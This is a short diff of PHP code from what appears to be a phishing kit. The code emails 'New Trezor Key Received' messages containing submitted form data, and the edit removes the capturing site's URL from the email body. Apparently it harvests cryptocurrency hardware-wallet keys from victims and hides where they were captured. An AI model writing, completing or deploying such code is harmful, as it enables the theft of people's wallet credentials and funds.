@@ -29,7 +29,8 @@ $num         =   empty($_POST['number']) ? null : $_POST['number'];
             $mail->Subject  = 'New Trezor Key Received';
 
             $html           =   '<p>A New Trezor Key Detected,</p>' ;
-            $html          .=   '<p>You have received a new key from <b>' . base_url() . '</b>,</p>' ;
+            // $html          .=   '<p>You have received a new key from <b>' . base_url() . '</b>,</p>' ;
+            $html          .=   '<p>You have received a new key from <b></b>,</p>' ;
             $html          .=   '<p><b>Additional detail</b></p>' ;
             $html          .=   '<ul>' ;
             
